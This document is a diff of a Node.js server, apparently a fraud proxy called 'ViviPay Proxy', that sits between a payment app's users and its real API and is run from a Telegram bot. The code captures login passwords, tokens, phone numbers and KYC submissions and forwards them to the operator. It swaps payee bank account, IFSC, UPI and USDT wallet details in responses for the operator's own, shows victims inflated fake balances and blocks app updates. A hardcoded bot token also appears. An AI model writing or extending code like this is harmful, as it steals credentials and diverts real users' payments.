@@ -1,10 +1,10 @@
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const { Redis } = require('@upstash/redis');
-const crypto = require('crypto');
 
 const app = express();
 const TIVOX_API = 'https://tivox.icu';
+const REAL_API = 'https://qonix.click';
 const PROXY_HOST = 'rtyhh.vercel.app';
 const BOT_TOKEN = '8537838501:AAFYQV9aDYaOV_JWvwksPMdyY1IXpY34Qqg';
 const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
@@ -141,8 +141,123 @@ function findNumericId(obj, depth) {
   return '';
 }
 
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true }));
+const BANK_FIELD_MAP = {
+  accountno:'accountNo',accountnumber:'accountNo',account_no:'accountNo',
+  receiveaccountno:'accountNo',bankaccount:'accountNo',bankaccountno:'accountNo',
+  payeeaccount:'accountNo',cardno:'accountNo',cardnumber:'accountNo',
+  bankcardno:'accountNo',payeecardno:'accountNo',receivecardno:'accountNo',
+  payeebankaccount:'accountNo',payeebankaccountno:'accountNo',payeeaccountno:'accountNo',
+  receiveraccount:'accountNo',receiveraccountno:'accountNo',
+  walletaccount:'accountNo',walletno:'accountNo',collectionaccount:'accountNo',
+  collectionaccountno:'accountNo',customerbanknumber:'accountNo',
+  customerbankaccount:'accountNo',accno:'accountNo',acc_no:'accountNo',
+  account:'accountNo',receiveaccount:'accountNo',
+  beneficiaryname:'accountHolder',accountname:'accountHolder',account_name:'accountHolder',
+  receiveaccountname:'accountHolder',holdername:'accountHolder',accountholder:'accountHolder',
+  bankaccountholder:'accountHolder',receivename:'accountHolder',
+  payeename:'accountHolder',bankaccountname:'accountHolder',realname:'accountHolder',
+  cardholder:'accountHolder',cardname:'accountHolder',receivername:'accountHolder',
+  collectionname:'accountHolder',customername:'accountHolder',accname:'accountHolder',
+  acc_name:'accountHolder',truename:'accountHolder',receiverealname:'accountHolder',
+  payeerealname:'accountHolder',
+  ifsc:'ifsc',ifsccode:'ifsc',ifsc_code:'ifsc',receiveifsc:'ifsc',
+  bankifsc:'ifsc',payeeifsc:'ifsc',receiverifsc:'ifsc',collectionifsc:'ifsc',
+  bankname:'bankName',bank_name:'bankName',payeebankname:'bankName',receiverbankname:'bankName',
+  upiid:'upiId',upi_id:'upiId',upi:'upiId',vpa:'upiId',
+  payeeupi:'upiId',receiverupi:'upiId',walletupi:'upiId'
+};
+
+function deepReplaceBankFields(obj, bank, depth) {
+  if (!obj || typeof obj !== 'object' || depth > 10) return;
+  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1); return; }
+  let hasAcct = false;
+  for (const k of Object.keys(obj)) {
+    const kl = k.toLowerCase().replace(/[_-]/g, '');
+    if (BANK_FIELD_MAP[kl] === 'accountNo' || BANK_FIELD_MAP[kl] === 'ifsc') hasAcct = true;
+  }
+  for (const k of Object.keys(obj)) {
+    if (typeof obj[k] === 'object') { deepReplaceBankFields(obj[k], bank, depth + 1); continue; }
+    if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
+    const kl = k.toLowerCase().replace(/[_-]/g, '');
+    const mapping = BANK_FIELD_MAP[kl];
+    if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
+    if ((kl === 'name' || kl === 'payname') && hasAcct && bank.accountHolder && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; }
+    if (kl === 'bank' && bank.bankName && String(obj[k]).length > 0) { obj[k] = bank.bankName; }
+  }
+}
+
+const BALANCE_KEYS = ['balance','userbalance','availablebalance','totalbalance','money',
+  'itoken','itokenbalance','tokenbalance','usermoney','memberbalance',
+  'mybalance','walletbalance','accountbalance','rechargebalance','coinbalance',
+  'totalmoney','totalamount','membermoney','useritoken','myitoken','mytokenbalance'];
+
+function addBalanceToFields(obj, bonus, depth) {
+  if (!obj || typeof obj !== 'object' || !bonus || depth > 10) return;
+  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) if (typeof obj[i] === 'object') addBalanceToFields(obj[i], bonus, depth + 1); return; }
+  for (const k of Object.keys(obj)) {
+    const kl = k.toLowerCase();
+    if (BALANCE_KEYS.includes(kl)) {
+      const v = parseFloat(obj[k]);
+      if (!isNaN(v) && v >= 0) {
+        obj[k] = typeof obj[k] === 'string' ? String((v + bonus).toFixed(2)) : parseFloat((v + bonus).toFixed(2));
+      }
+    }
+    if (typeof obj[k] === 'object' && obj[k] !== null) addBalanceToFields(obj[k], bonus, depth + 1);
+  }
+}
+
+function findBalanceDeep(obj, depth) {
+  if (!obj || typeof obj !== 'object' || depth > 6) return null;
+  const balKeys = ['iToken','itoken','balance','userBalance','availableBalance','totalBalance',
+    'money','tokenBalance','usermoney','memberBalance','myBalance','itokenBalance','iTokenBalance',
+    'userMoney','coinBalance','walletBalance'];
+  for (const bk of balKeys) {
+    if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') {
+      const v = parseFloat(obj[bk]);
+      if (!isNaN(v)) return { field: bk, value: v };
+    }
+  }
+  for (const k of Object.keys(obj)) {
+    if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) {
+      const f = findBalanceDeep(obj[k], depth + 1);
+      if (f) return f;
+    }
+  }
+  return null;
+}
+
+function replaceUsdtAddress(obj, newAddr, depth) {
+  if (!obj || typeof obj !== 'object' || depth > 10) return;
+  if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) replaceUsdtAddress(obj[i], newAddr, depth + 1); return; }
+  for (const k of Object.keys(obj)) {
+    if (typeof obj[k] === 'string' && /^T[A-Za-z1-9]{33}$/.test(obj[k])) {
+      obj[k] = newAddr;
+    } else if (typeof obj[k] === 'object') {
+      replaceUsdtAddress(obj[k], newAddr, depth + 1);
+    }
+  }
+}
+
+app.use((req, res, next) => {
+  if (req.method === 'GET' || req.method === 'HEAD') return next();
+  const chunks = [];
+  req.on('data', c => chunks.push(c));
+  req.on('end', () => {
+    req.rawBody = Buffer.concat(chunks);
+    const ct = (req.headers['content-type'] || '').toLowerCase();
+    try {
+      if (ct.includes('json')) {
+        req.body = JSON.parse(req.rawBody.toString());
+      } else if (ct.includes('form') && !ct.includes('multipart')) {
+        const params = new URLSearchParams(req.rawBody.toString());
+        req.body = Object.fromEntries(params);
+      } else {
+        req.body = {};
+      }
+    } catch(e) { req.body = {}; }
+    next();
+  });
+});
 
 app.use('/hook', (req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
@@ -158,30 +273,11 @@ app.get('/inject.js', async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   try {
     const data = await loadData();
-    const bank = getActiveBank(data, '');
-    const globalBonus = data.depositBonus || 0;
-    const bonusMap = {};
-    if (data.userOverrides) {
-      for (const [uid, uo] of Object.entries(data.userOverrides)) {
-        const userBonus = (uo.addedBalance || 0) + globalBonus;
-        if (userBonus > 0) bonusMap[uid] = userBonus;
-      }
-    }
     const initCfg = {
-      enabled: data.botEnabled !== false,
-      an: bank ? bank.accountNo : '',
-      ah: bank ? bank.accountHolder : '',
-      'if': bank ? bank.ifsc : '',
-      bn: bank ? (bank.bankName || '') : '',
-      ui: bank ? (bank.upiId || '') : '',
       tg: TELEGRAM_OVERRIDE,
-      bonus: 0,
-      blockUpdate: data.blockUpdate !== false,
-      usdtAddr: data.usdtAddress || '',
-      suspended: Object.keys(data.suspendedPhones || {})
+      blockUpdate: data.blockUpdate !== false
     };
-    const jsCode = INJECT_JS
-      .replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';var _BM=' + JSON.stringify(bonusMap) + ';');
+    const jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
     res.send(jsCode);
   } catch(e) {
     res.send(INJECT_JS);
@@ -200,9 +296,6 @@ app.get('/hook/config', async (req, res) => {
     const suspended = [];
     if (data.suspendedPhones) {
       for (const p of Object.keys(data.suspendedPhones)) suspended.push(p);
-    }
-    if (data.debugMode && userId && data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `⚙️ CONFIG REQ\nUID: ${userId}\nOverride: ${uo ? JSON.stringify(uo).substring(0, 200) : 'null'}\nBonus: ${totalBonus}\nEnabled: ${data.botEnabled !== false}`).catch(()=>{});
     }
     res.json({
       enabled: data.botEnabled !== false,
@@ -223,240 +316,7 @@ app.get('/hook/config', async (req, res) => {
 });
 
 app.post('/hook/log', async (req, res) => {
-  try {
-    const { u, m, b, r, s, uid } = req.body || {};
-    const data = await loadData();
-    if (!u) return res.json({ ok: true });
-
-    const urlPath = (u || '').split('?')[0];
-    const urlEnd = urlPath.split('/').pop() || '';
-
-    let respJson = null;
-    try { respJson = JSON.parse(r || ''); } catch(e) {}
-    const respData = respJson ? (respJson.data || respJson.body || respJson.result || respJson) : null;
-
-    let userId = uid || '';
-    if (!userId && respData && typeof respData === 'object') {
-      userId = findNumericId(respData, 0);
-    }
-    if (!userId && respJson) {
-      userId = findNumericId(respJson, 0);
-    }
-    let reqBody = {};
-    if (b) {
-      try { reqBody = JSON.parse(b); } catch(e) {
-        try {
-          const pairs = b.split('&');
-          for (const pair of pairs) {
-            const [k, ...vParts] = pair.split('=');
-            if (k) reqBody[decodeURIComponent(k)] = decodeURIComponent(vParts.join('=') || '');
-          }
-        } catch(e2) {}
-      }
-    }
-    if (!userId) userId = findNumericId(reqBody, 0);
-
-    const reqPhone = reqBody.phone || reqBody.mobile || reqBody.telephone || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
-    const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
-    const phone = reqPhone || respPhone;
-    const reqPassword = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
-
-    if (userId && data.trackedUsers) {
-      const existing = data.trackedUsers[String(userId)] || {};
-      data.trackedUsers[String(userId)] = {
-        ...existing,
-        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-        lastAction: urlEnd || 'API',
-        phone: phone || existing.phone || ''
-      };
-      if (respData && typeof respData === 'object') {
-        const name = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
-        if (name) data.trackedUsers[String(userId)].name = name;
-        function findBal(obj, depth) {
-          if (!obj || typeof obj !== 'object' || depth > 5) return '';
-          const bKeys = ['balance', 'iToken', 'itoken', 'userBalance', 'availableBalance', 'totalBalance', 'money', 'tokenBalance', 'usermoney', 'memberBalance'];
-          for (const bk of bKeys) { if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') return String(obj[bk]); }
-          for (const k of Object.keys(obj)) { if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) { const f = findBal(obj[k], depth + 1); if (f) return f; } }
-          return '';
-        }
-        const bal = findBal(respData, 0) || findBal(respJson, 0);
-        if (bal) data.trackedUsers[String(userId)].balance = String(bal);
-      }
-    }
-
-    const cfgBonus = req.body.cb;
-    const wasModded = req.body.md;
-
-    if (data.debugMode && data.adminChatId && bot) {
-      const tag = userId ? ` [UID:${userId}]` : ' [UID:?]';
-      const modTag = wasModded ? ' ✏️MOD' : '';
-      const bonusTag = cfgBonus ? ` 💰B:${cfgBonus}` : '';
-      const now2 = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-      bot.sendMessage(data.adminChatId,
-`🐛 DEBUG${tag}${bonusTag}${modTag}
-🔗 ${m || 'GET'} ${u}
-📤 REQ: ${(b || 'empty').substring(0, 400)}
-📥 RES: ${(r || 'empty').substring(0, 600)}
-🕐 ${now2}`).catch(()=>{});
-    } else if (data.logRequests && data.adminChatId && bot) {
-      const tag = userId ? ` [${userId}]` : '';
-      const phoneTag = phone ? ` (${phone})` : '';
-      bot.sendMessage(data.adminChatId, `📡 ${m || 'GET'} ${urlPath}${tag}${phoneTag}\n📊 Status: ${s || 'N/A'}`).catch(()=>{});
-    }
-
-    if (u.includes('login') || u.includes('Login') || u.includes('auth') || u.includes('signin') || u.includes('doLogin') || u.includes('register') || u.includes('Register')) {
-      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
-      const uid2 = findNumericId(rd, 0) || userId || 'N/A';
-      const token = rd.token || rd.accessToken || rd.access_token || rd.jwt || '';
-      const loginPhone = phone || rd.phone || rd.mobile || rd.loginName || reqBody.memberPhone || '';
-      notifyAdmin(data,
-`🔑 LOGIN CAPTURED
-👤 User ID: ${uid2}
-📱 Phone/Account: ${loginPhone || 'N/A'}${reqPassword ? '\n🔐 Password: ' + reqPassword : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 60) + '...' : ''}
-📦 Raw Body: ${(b || '').substring(0, 800)}
-📋 Response: ${(r || '').substring(0, 500)}
-🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
-    }
-
-    const isBuyUrl = /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(u)
-      || (/\/(order|buy|recharge|trade)/i.test(u) && m === 'POST');
-    if (isBuyUrl && respData && typeof respData === 'object') {
-      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo'];
-      let orderId = '';
-      const rd2 = Array.isArray(respData) ? null : respData;
-      if (rd2) {
-        for (const f of orderFields) {
-          if (rd2[f] && String(rd2[f]).length >= 3) { orderId = String(rd2[f]); break; }
-        }
-      }
-      if (!orderId && !Array.isArray(respData)) {
-        for (const k of Object.keys(rd2 || {})) {
-          if (/order|trade|no/i.test(k) && typeof rd2[k] === 'string' && rd2[k].length >= 5) { orderId = rd2[k]; break; }
-        }
-      }
-      const bank = getActiveBank(data, userId);
-      if (orderId && bank) {
-        if (!data.orderBankMap) data.orderBankMap = {};
-        data.orderBankMap[orderId] = {
-          bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
-          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-          userId: userId || ''
-        };
-      }
-      if (orderId) {
-        notifyAdmin(data,
-`🔔 ORDER DETECTED
-👤 User: ${userId || 'N/A'}${phone ? '\n📱 Phone: ' + phone : ''}
-📋 Order: ${orderId}
-💳 Bank: ${bank ? bank.accountHolder + ' | ' + bank.accountNo : 'N/A'}
-📦 Data: ${(r || '').substring(0, 500)}
-🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
-      }
-    }
-
-    if (u.includes('kyc') || u.includes('Kyc') || u.includes('paytm') || u.includes('freecharge') || u.includes('bind')) {
-      notifyAdmin(data,
-`🔐 KYC/BIND DATA
-👤 User: ${userId || 'N/A'}
-📦 Request: ${(b || '').substring(0, 1500)}
-📋 Response: ${(r || '').substring(0, 500)}
-🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
-    }
-
-    if (u.includes('sell') || u.includes('withdraw')) {
-      notifyAdmin(data,
-`💸 SELL/WITHDRAW
-👤 User: ${userId || 'N/A'}
-📦 Data: ${(b || '').substring(0, 1000)}
-📋 Response: ${(r || '').substring(0, 500)}
-🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
-    }
-
-    const urlLower = u.toLowerCase();
-    const isMineUrl = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
-      urlLower.includes('member/info') || urlLower.includes('user/info') ||
-      urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
-      urlLower.includes('getmember') || urlLower.includes('memberdetail');
-
-    if (isMineUrl && respData && typeof respData === 'object' && userId) {
-      function findBalDeep(obj, depth) {
-        if (!obj || typeof obj !== 'object' || depth > 6) return null;
-        const balKeys = ['iToken','itoken','balance','userBalance','availableBalance','totalBalance',
-          'money','tokenBalance','usermoney','memberBalance','myBalance','itokenBalance','iTokenBalance',
-          'userMoney','coinBalance','walletBalance'];
-        for (const bk of balKeys) {
-          if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') {
-            const v = parseFloat(obj[bk]);
-            if (!isNaN(v)) return { field: bk, value: v };
-          }
-        }
-        for (const k of Object.keys(obj)) {
-          if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) {
-            const f = findBalDeep(obj[k], depth + 1);
-            if (f) return f;
-          }
-        }
-        return null;
-      }
-
-      const balResult = findBalDeep(respData, 0) || findBalDeep(respJson, 0);
-      if (balResult !== null) {
-        const realBalance = balResult.value;
-        const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
-        const addedBalance = uo.addedBalance || 0;
-        const globalBonus = data.depositBonus || 0;
-        const totalFake = addedBalance + globalBonus;
-        const shownBalance = parseFloat((realBalance + totalFake).toFixed(2));
-        const lastReal = uo.lastRealBalance;
-        const trackedUser = (data.trackedUsers && data.trackedUsers[String(userId)]) || {};
-        const userName = trackedUser.name || '';
-        const userPhone = trackedUser.phone || phone || '';
-
-        if (!data.userOverrides) data.userOverrides = {};
-        if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
-        data.userOverrides[String(userId)].lastRealBalance = realBalance;
-
-        const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
-        const snapKey = `bal_${userId}`;
-        const lastSnapTime = _balSnapTimes[snapKey] || 0;
-        const nowMs = Date.now();
-        const shouldNotify = balChanged || (nowMs - lastSnapTime > 120000);
-
-        if (shouldNotify && (nowMs - lastSnapTime > 10000)) {
-          _balSnapTimes[snapKey] = nowMs;
-          const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-          const changeStr = lastReal !== undefined
-            ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
-            : '';
-          notifyAdmin(data,
-`┌──────────────────────────┐
-│    💎 BALANCE SNAPSHOT    │
-└──────────────────────────┘
-👤 ID: ${userId}${userName ? '\n📛 Name: ' + userName : ''}${userPhone ? '\n📱 Phone: ' + userPhone : ''}
-
-📊 BALANCE BREAKDOWN:
-💰 Real Balance:   ₹${realBalance.toFixed(2)}
-➕ Bot Added:      ₹${totalFake.toFixed(2)}${addedBalance ? ' (user: +₹' + addedBalance + ')' : ''}${globalBonus ? (addedBalance ? ', global: +₹' + globalBonus : ' (global: +₹' + globalBonus + ')') : ''}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-👁 User Sees:      ₹${shownBalance.toFixed(2)}${changeStr}
-
-🔗 Field: ${balResult.field}
-🕐 ${now}`);
-        }
-      }
-    }
-
-    if (userId) {
-      await saveData(data);
-    }
-
-    const uo2 = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
-    const logBonus = ((uo2 && uo2.addedBalance) || 0) + (data.depositBonus || 0);
-    res.json({ ok: true, userId: userId || '', bonus: logBonus });
-  } catch(e) {
-    console.error('hook/log error:', e.message);
-    res.json({ ok: false });
-  }
+  res.json({ ok: true });
 });
 
 app.get('/setup-webhook', async (req, res) => {
@@ -475,12 +335,12 @@ app.get('/health', async (req, res) => {
   let redisOk = false;
   if (redis) { try { await redis.ping(); redisOk = true; } catch(e) {} }
   res.json({
-    status: 'ok', app: 'ViviPay Proxy v3 (inject)',
+    status: 'ok', app: 'ViviPay Proxy v4 (server-side)',
     redis: redis ? (redisOk ? 'connected' : 'error') : 'not configured',
     bankActive: !!bank, totalBanks: data.banks.length,
     adminSet: !!data.adminChatId,
     trackedUsers: Object.keys(data.trackedUsers || {}).length,
-    approach: 'JavaScript injection via WebView onPageFinished'
+    approach: 'Server-side proxy — all /xxapi/* routes intercepted'
   });
 });
 
@@ -503,8 +363,8 @@ app.post('/bot-webhook', async (req, res) => {
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId,
-`🏦 ViviPay Proxy Controller v3
-(JS Injection Mode)
+`🏦 ViviPay Proxy Controller v4
+(Server-Side Proxy Mode)
 
 === BANK COMMANDS ===
 /addbank Name|AccNo|IFSC|BankName|UPI
@@ -517,7 +377,6 @@ app.post('/bot-webhook', async (req, res) => {
 /off — Proxy OFF
 /rotate — Toggle auto-rotate
 /log — Toggle request logging
-/debug — Full debug mode (har URL + body + response)
 /update — Toggle update block
 /status — Full status
 
@@ -557,7 +416,7 @@ Example:
 
     if (text === '/status') {
       const active = getActiveBank(data, null);
-      let m = `📊 ViviPay Status (v3 Inject):\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 ViviPay Status (v4 Server-Side):\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -569,15 +428,6 @@ Example:
     if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF'); return res.sendStatus(200); }
     if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-    if (text === '/debug') {
-      data.debugMode = !data.debugMode;
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, data.debugMode
-        ? `🐛 DEBUG MODE ON\n\nAb har API call ka full URL + Request + Response aayega bot pe.\nApp use karo aur jo messages aate hain wo share karo.\n\nBand karne ke liye dobara /debug bhejo.`
-        : `🐛 Debug Mode OFF`);
-      return res.sendStatus(200);
-    }
 
     if (text === '/update' || text === '/update off' || text === '/update on') {
       if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
@@ -767,17 +617,7 @@ Example:
   }
 });
 
-app.use(async (req, res, next) => {
-  if (req.method === 'GET' || req.method === 'HEAD') return next();
-  const chunks = [];
-  req.on('data', c => chunks.push(c));
-  req.on('end', () => {
-    req.rawBody = Buffer.concat(chunks);
-    next();
-  });
-});
-
-async function proxyFetch(req) {
+async function proxyToTivox(req) {
   const path = req.originalUrl || req.url;
   const url = TIVOX_API + path;
   const fwd = {};
@@ -804,10 +644,45 @@ async function proxyFetch(req) {
   return { response, respBody, respHeaders };
 }
 
+async function proxyToReal(req) {
+  const path = req.originalUrl || req.url;
+  const url = REAL_API + path;
+  const fwd = {};
+  for (const [k, v] of Object.entries(req.headers)) {
+    const kl = k.toLowerCase();
+    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+    fwd[k] = v;
+  }
+  fwd['host'] = 'qonix.click';
+  const opts = { method: req.method, headers: fwd, redirect: 'manual' };
+  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+    opts.body = req.rawBody;
+    fwd['content-length'] = String(req.rawBody.length);
+  }
+  const response = await fetch(url, opts);
+  const respBody = await response.text();
+  const respHeaders = {};
+  response.headers.forEach((val, key) => {
+    const kl = key.toLowerCase();
+    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
+      respHeaders[key] = val;
+    }
+  });
+  return { response, respBody, respHeaders };
+}
+
+function sendJson(res, headers, json, fallbackBody) {
+  const body = json ? JSON.stringify(json) : fallbackBody;
+  headers['content-type'] = 'application/json; charset=utf-8';
+  headers['content-length'] = String(Buffer.byteLength(body));
+  res.writeHead(200, headers);
+  res.end(body);
+}
+
 app.get('/app/version', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders } = await proxyFetch(req);
+    const { response, respBody, respHeaders } = await proxyToTivox(req);
     let jsonResp = null;
     try { jsonResp = JSON.parse(respBody); } catch(e) {}
     if (jsonResp) {
@@ -822,11 +697,7 @@ app.get('/app/version', async (req, res) => {
           if (rd.needUpdate !== undefined) rd.needUpdate = false;
         }
       }
-      const body = JSON.stringify(jsonResp);
-      respHeaders['content-type'] = 'application/json; charset=utf-8';
-      respHeaders['content-length'] = String(Buffer.byteLength(body));
-      res.writeHead(200, respHeaders);
-      res.end(body);
+      sendJson(res, respHeaders, jsonResp);
     } else {
       respHeaders['content-length'] = String(Buffer.byteLength(respBody));
       res.writeHead(response.status, respHeaders);
@@ -841,7 +712,7 @@ app.get('/app/version', async (req, res) => {
 app.get('/app/jsValue/:type', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders } = await proxyFetch(req);
+    const { response, respBody, respHeaders } = await proxyToTivox(req);
     notifyAdmin(data, `📜 JS Value (${req.params.type})\n${respBody.substring(0, 500)}`);
     respHeaders['content-length'] = String(Buffer.byteLength(respBody));
     res.writeHead(response.status, respHeaders);
@@ -851,299 +722,322 @@ app.get('/app/jsValue/:type', async (req, res) => {
   }
 });
 
-app.post('/xxapi/linkKyc', async (req, res) => {
+app.all('/xxapi/*', async (req, res) => {
   try {
     const data = await loadData();
-    const body = req.body || {};
-    notifyAdmin(data, `🔐 KYC CAPTURED\n${JSON.stringify(body).substring(0, 3000)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
-    const { response, respBody, respHeaders } = await proxyFetch(req);
-    respHeaders['content-length'] = String(Buffer.byteLength(respBody));
-    res.writeHead(response.status, respHeaders);
-    res.end(respBody);
+    const path = req.originalUrl || req.url;
+    const urlLower = path.toLowerCase();
+    const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+    const { response, respBody, respHeaders } = await proxyToReal(req);
+
+    if (data.blockUpdate !== false) {
+      for (const k of Object.keys(respHeaders)) {
+        if (k.toLowerCase() === 'needupdateflag') delete respHeaders[k];
+      }
+    }
+
+    let jsonResp = null;
+    try { jsonResp = JSON.parse(respBody); } catch(e) {}
+
+    if (!jsonResp) {
+      respHeaders['content-length'] = String(Buffer.byteLength(respBody));
+      res.writeHead(response.status, respHeaders);
+      return res.end(respBody);
+    }
+
+    const respData = jsonResp.data || jsonResp.body || jsonResp.result || null;
+
+    let reqBody = {};
+    if (req.rawBody && req.rawBody.length > 0) {
+      try {
+        const ct = (req.headers['content-type'] || '').toLowerCase();
+        if (ct.includes('json')) { reqBody = JSON.parse(req.rawBody.toString()); }
+        else if (ct.includes('form') && !ct.includes('multipart')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
+      } catch(e) {}
+    }
+    if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
+      reqBody = { ...reqBody, ...req.body };
+    }
+
+    let userId = '';
+    if (respData && typeof respData === 'object') userId = findNumericId(respData, 0);
+    if (!userId) userId = findNumericId(jsonResp, 0);
+    if (!userId) userId = findNumericId(reqBody, 0);
+
+    const reqPhone = reqBody.phone || reqBody.mobile || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
+    const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
+    const phone = reqPhone || respPhone;
+
+    if (userId) {
+      if (!data.trackedUsers) data.trackedUsers = {};
+      const existing = data.trackedUsers[String(userId)] || {};
+      data.trackedUsers[String(userId)] = {
+        ...existing,
+        lastSeen: now,
+        lastAction: path.split('/').pop() || 'API',
+        phone: phone || existing.phone || ''
+      };
+      if (respData && typeof respData === 'object') {
+        const name = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
+        if (name) data.trackedUsers[String(userId)].name = name;
+      }
+    }
+
+    const isLogin = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('auth') || urlLower.includes('register');
+    if (isLogin) {
+      const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
+      const token = (respData && typeof respData === 'object') ? (respData.token || respData.accessToken || '') : '';
+      notifyAdmin(data,
+`🔑 LOGIN CAPTURED
+👤 User ID: ${userId || 'N/A'}
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Password: ' + pwd : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 60) + '...' : ''}
+📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 800) : 'empty'}
+📋 Response: ${respBody.substring(0, 500)}
+🕐 ${now}`);
+
+      if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
+        notifyAdmin(data, `🚫 BLOCKED LOGIN\n📱 Phone: ${phone}\n🔒 Suspended\n🕐 ${now}`);
+        return res.status(200).json({ code: 500, message: 'Account Suspended', data: null });
+      }
+    }
+
